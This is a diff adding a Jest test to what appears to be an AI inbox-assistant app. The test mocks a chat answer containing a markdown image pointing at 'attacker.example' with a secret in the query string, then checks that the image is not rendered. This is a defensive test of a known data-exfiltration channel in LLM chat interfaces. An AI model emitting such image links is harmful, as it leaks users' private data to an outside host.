@@ -454,6 +454,18 @@ describe('App', () => {
     expect(screen.getByText(/claude-opus-4-8 · \d/)).toBeInTheDocument()
   })
 
+  it('does not render images from chat answers (exfiltration channel)', async () => {
+    streamChat.mockImplementation(async (_req, onToken) => {
+      onToken('Done. ![x](https://attacker.example/p?d=secret)')
+    })
+    render(<App />)
+    await screen.findByText('Sarah Chen')
+    await userEvent.type(screen.getByPlaceholderText('Ask about your inbox…'), 'hello')
+    await userEvent.keyboard('{Enter}')
+    expect(await screen.findByText(/Done\./)).toBeInTheDocument()
+    expect(document.querySelector('img[src*="attacker.example"]')).toBeNull()
+  })
+
   it('switches the chat model from the chat pane dropdown', async () => {
     api.updateSettings.mockResolvedValue({
       window_days: 90,
